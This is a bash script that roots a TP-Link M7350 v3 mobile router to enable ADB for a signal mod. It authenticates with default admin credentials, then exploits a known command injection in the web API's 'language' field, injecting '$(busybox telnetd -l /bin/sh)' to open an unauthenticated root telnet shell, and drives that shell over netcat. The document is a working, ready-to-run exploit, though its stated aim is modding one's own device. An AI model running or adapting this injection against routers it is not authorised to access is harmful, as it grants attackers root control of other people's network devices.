#!/usr/bin/env bash
# Enable ADB on a TP-Link M7350 v3 (fw 1.1.3 Build 161226, MDM9625).
#
# Authenticates to the router's web API, uses a known v3 command injection
# (language parameter in the webServer module) to start telnetd, then connects
# over telnet to switch USB composition to 902B (RNDIS + ADB + Mass Storage).
#
# Requirements:
#   - On the router's WiFi or USB-tethered LAN (192.168.0.1 reachable).
#   - curl, python3, nc (netcat), and md5/md5sum on PATH.
#   - Default web credentials: admin / admin.
#
# After this script finishes the device reboots. Reconnect USB and run:
#   adb devices && adb shell
set -euo pipefail

ROUTER="${ROUTER:-192.168.0.1}"
USERNAME="${USERNAME:-admin}"
PASSWORD="${PASSWORD:-admin}"

say(){ printf '\033[1;36m[*]\033[0m %s\n' "$1"; }
err(){ printf '\033[1;31m[!]\033[0m %s\n' "$1" >&2; }

md5hash(){
  if command -v md5 >/dev/null 2>&1; then
    printf '%s' "$1" | md5 -q
  else
    printf '%s' "$1" | md5sum | cut -d' ' -f1
  fi
}

say "Checking connectivity to $ROUTER..."
if ! curl -s --max-time 3 -o /dev/null "http://$ROUTER/login.html"; then
  err "Cannot reach http://$ROUTER — are you on the router's network?"
  exit 1
fi

say "Authenticating to web API..."
AUTH_RESP=$(curl -s --max-time 5 "http://$ROUTER/cgi-bin/qcmap_auth" \
  -d '{"module":"authenticator","action":0}')
NONCE=$(echo "$AUTH_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('nonce',''))" 2>/dev/null || true)
if [ -z "$NONCE" ]; then
  err "Failed to get auth nonce. Response: $AUTH_RESP"
  exit 1
fi
say "Got nonce: $NONCE"
TOKEN=$(md5hash "${USERNAME}:${PASSWORD}:${NONCE}")
say "Computed token: $TOKEN"

say "Starting telnetd on the router..."
RCE_RESP=$(curl -s --max-time 5 "http://$ROUTER/cgi-bin/qcmap_web_cgi" \
  -d "{\"module\":\"webServer\",\"action\":1,\"token\":\"$TOKEN\",\"language\":\"\$(busybox telnetd -l /bin/sh)\"}")
if echo "$RCE_RESP" | grep -q '"result":0'; then
  say "telnetd started successfully."
else
  err "Unexpected response: $RCE_RESP"
  err "telnetd may or may not be running. Trying anyway..."
fi
sleep 1

say "Connecting via telnet to set usb_composition 902B..."
say "(Sends the command and answers the three prompts: n, y, y)"
{
  sleep 1
  printf 'usb_composition 902B\r\n'
  sleep 2
  printf 'n\r\n'
  sleep 1
  printf 'y\r\n'
  sleep 1
  printf 'y\r\n'
  sleep 1
} | nc -w 10 "$ROUTER" 23 || true

say "USB composition command sent. The device should reboot in a few seconds."
say ""
say "After reboot:"
say "  1. Reconnect the USB cable"
say "  2. Run: adb devices"
say "  3. Run: adb shell   (root shell)"
say ""
say "Then install the signal mod:"
say "  ADB=/path/to/adb ./scripts/install.sh"
